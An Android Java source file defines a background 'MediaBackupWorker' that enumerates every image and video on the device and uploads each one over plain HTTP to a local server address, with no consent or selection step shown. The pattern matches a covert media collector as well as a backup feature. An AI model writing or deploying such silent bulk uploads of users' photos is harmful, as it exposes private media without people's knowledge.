package com.fcorp.soul;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;

import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.File;
import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.MultipartBody;
import okhttp3.MediaType;

class MediaBackupWorker extends Worker {

    public MediaBackupWorker(Context context, WorkerParameters params) {
        super(context, params);
    }

    @Override
    public Result doWork() {
        try {
            backupMediaFiles();
            return Result.success();
        } catch (Exception e) {
            e.printStackTrace();
            return Result.failure();
        }
    }

    private void backupMediaFiles() {
        String[] projection = {MediaStore.MediaColumns.DATA};
        String[] mediaTypes = {MediaStore.Images.Media.EXTERNAL_CONTENT_URI.toString(),
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI.toString()};

        for (String mediaType : mediaTypes) {
            Uri mediaUri = Uri.parse(mediaType);
            Cursor cursor = getApplicationContext().getContentResolver().query(
                    mediaUri, projection, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
                    File file = new File(filePath);
                    if (file.exists()) {
                        uploadMediaFile(file);
                    }
                }
                cursor.close();
            }
        }
    }

    private void uploadMediaFile(File file) {
        String serverUrl = "http://127.0.0.1:4040";

        OkHttpClient client = new OkHttpClient();
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();

        Request request = new Request.Builder()
                .url(serverUrl)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
                response.close();
            }
        });
    }
}
